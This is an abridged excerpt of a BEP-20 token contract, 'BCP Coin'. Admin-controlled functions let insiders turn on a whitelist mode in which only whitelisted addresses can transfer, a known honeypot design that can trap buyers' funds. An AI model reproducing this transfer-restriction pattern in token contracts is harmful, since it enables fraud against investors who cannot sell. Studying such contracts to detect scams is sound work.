...
/**
BCP Coin(BCP) / BEP-20
Submitted for verification at bscscan.com on 2023-8-18
 */
...
contract BCP is ERC20Detailed, ERC20Pausable {
    ...
    mapping(address => bool) public sAddress;
    ...
    modifier onlyWhitelistAdmin() {
            require(sAddress[msg.sender] == true, "role: wut?");
            _;
    }
    ...
    function setSAddress(address _sAddr, bool approved) public onlyWhitelistAdmin {
        sAddress[_sAddr] = approved;
    }

    function whitelist(address _address, bool _approved ) external onlyWhitelistAdmin   {
        whitelists[_address] = _approved;
    }

    function setRule(bool _whitelist, address _swapPair) external onlyWhitelistAdmin {
        white = _whitelist;
        swapPair = _swapPair;
    }
    ...
    function _beforeTokenTransfer(
        ...
        if (white == true) {
            require(whitelists[from] || whitelists[to], "Invalid whitelist");
            return;
        }
